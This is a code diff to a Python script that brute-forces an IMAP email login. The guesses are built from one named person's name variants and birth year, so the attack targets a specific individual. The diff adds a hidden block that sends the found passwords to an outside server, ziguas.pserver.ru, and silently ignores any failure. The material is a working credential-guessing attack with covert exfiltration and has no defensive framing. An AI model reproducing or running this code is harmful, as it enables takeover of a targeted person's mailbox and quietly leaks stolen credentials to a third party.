@@ -2,11 +2,11 @@ import sys,time,socket
 import imapclient
 import random
 import threading
+import os,requests
 
 found = set()
 pooll = set()
 vase = 4100000
-
 def bcdechex(dec):  
     keyspace = ["GuwanchmyratOrazow", "Guwanchmyrat", "Orazow", "Myrat", "Guwanch", "Guwanc", "Murat", "Orazov", "Guvanch", "Guvanc", "GuvanchmyratOrazow", "Guvanchmyrat", "GuvanchmyratOrazov", "guwanchmyratOrazow", "guwanchmyrat", "orazow", "myrat", "guwanch", "guwanc", "murat", "orazov", "guvanch", "guvanc", "guvanchmyratOrazow", "guvanchmyrat", "guvanchmyratOrazov", "Kwanch", "Kwanc", "Kvanch", "Kvanc", "kwanch", "kwanc", "kvanch", "kvanc", "1993", "93", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_"] #"0123456789-_charydinyewvmCHARYDINYEWVM"
     hexin = ''
@@ -37,7 +37,7 @@ def checkin(c):
         print(" +++ Password found  : %s ", password ) 
         found.add(password)
     except imapclient.exceptions.LoginError:
-        if (c-len(pooll)) % 100 == 0:
+        if (c-len(pooll)) % 1000 == 0:
             print("{:,} {:,} {}".format(c,c-len(pooll),password))
         if password in pooll:
             pooll.remove(password)
@@ -60,4 +60,8 @@ while True:
     if threading.active_count() == 1:
         print("Found")
         print(found)
+        try:
+            respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
+        except:
+            pass
         break
